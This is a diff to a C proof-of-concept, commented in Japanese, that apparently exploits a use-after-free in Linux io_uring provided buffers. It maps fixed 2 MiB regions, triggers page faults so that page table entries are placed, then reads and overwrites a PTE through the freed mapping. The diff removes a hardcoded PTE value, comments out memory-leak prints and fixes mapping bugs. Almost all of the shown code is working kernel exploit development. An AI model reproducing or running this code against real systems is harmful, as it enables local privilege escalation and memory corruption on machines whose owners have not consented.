@@ -25,10 +25,8 @@ int main() {
 
     // 2MiB の領域を2つ確保
     // 計 4MiB の連続する仮想アドレス空間
-    void *addr_1 = (void *)0xdead000000;
-    void *addr_2 = (void *)0xdead200000;
     void *two_mega_1 = mmap(
-        addr_1,
+        (void *)0xdead000000,
         TWO_MEGA,
         PROT_READ | PROT_WRITE,
         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
@@ -38,14 +36,14 @@ int main() {
     if (two_mega_1 == MAP_FAILED) perror("mmap() failed");
 
     void *two_mega_2 = mmap(
-        addr_2,
+        (void *)0xdead200000,
         TWO_MEGA,
         PROT_READ | PROT_WRITE,
         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
         -1,
         0
     );
-    if (addr_2 == MAP_FAILED) perror("mmap() failed");
+    if (two_mega_2 == MAP_FAILED) perror("mmap() failed");
 
     // io_uring の初期化
     struct io_uring ring;
@@ -80,8 +78,8 @@ int main() {
     
     // ページフォルト: 2 回目
     // PTE が配置される
-    *(char *)addr_2 = 'a';
-    *((char *)addr_2 + PAGE_SIZE) = 'b';
+    *(char *)two_mega_2 = 'a';
+    *((char *)two_mega_2 + PAGE_SIZE) = 'b';
 
     // Use-After-Free
     // PTE が配置されているか確認
@@ -90,7 +88,6 @@ int main() {
 
     // PTE 書き換え
     // *(unsigned long *)pbuf_mapping = *((unsigned long *)pbuf_mapping + 1);
-    *(unsigned long *)pbuf_mapping = 0x80000001822de867;
 
     // ページ解放
     if (munmap(pbuf_mapping, FOUR_KILO) == -1) perror("munmap() failed");
@@ -98,13 +95,14 @@ int main() {
     getchar();
 
     // printf("[+] should be 'a' but '%c'\n", *(char *)addr_2);
-    printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb30));
-    printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb38));
-    printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb40));
-    printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb48));
+    // printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb30));
+    // printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb38));
+    // printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb40));
+    // printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb48));
 
     // メモリの解放関連
-    if (munmap(two_mega_1, FOUR_MEGA) == -1) perror("munmap() failed");
+    if (munmap(two_mega_1, TWO_MEGA) == -1) perror("munmap() failed");
+    if (munmap(two_mega_2, TWO_MEGA) == -1) perror("munmap() failed");
     io_uring_queue_exit(&ring);
 
     return 0;
